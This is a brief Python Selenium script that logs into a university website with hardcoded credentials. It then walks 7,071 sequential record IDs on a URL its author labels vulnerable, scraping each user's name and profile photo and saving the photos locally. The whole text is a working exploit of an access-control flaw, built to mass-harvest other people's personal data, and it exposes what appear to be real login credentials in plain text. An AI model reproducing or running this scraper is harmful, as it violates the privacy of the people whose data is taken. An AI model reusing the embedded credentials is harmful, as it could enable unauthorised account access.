from selenium.webdriver import Chrome
import requests
Driver = Chrome(executable_path=r'D:\chromedriver\chromedriver.exe')
Driver.get("https://myUniDomain/")
Driver.find_element_by_id("username").send_keys("9615429141")
Driver.find_element_by_id("password").send_keys("Aa@0924636459")
Driver.find_element_by_id("loginbtn").click()
for r in range(1, 7072):
    Driver.get("vulnerabeURL"+str(r))
    name= Driver.find_element_by_xpath("//*[@id='region-main']/div/div/div/div[1]/div/div[1]/h3").text
    source = Driver.find_element_by_css_selector("#region-main > div > div > div > div.col-sm-12.col-md-3 > div > div.card-body > div.profilepic > img").get_attribute("src")
    print(name+" "+source)
    r = requests.get(source, allow_redirects=True)
    open(name[1:len(name)]+'.png', 'wb').write(r.content)









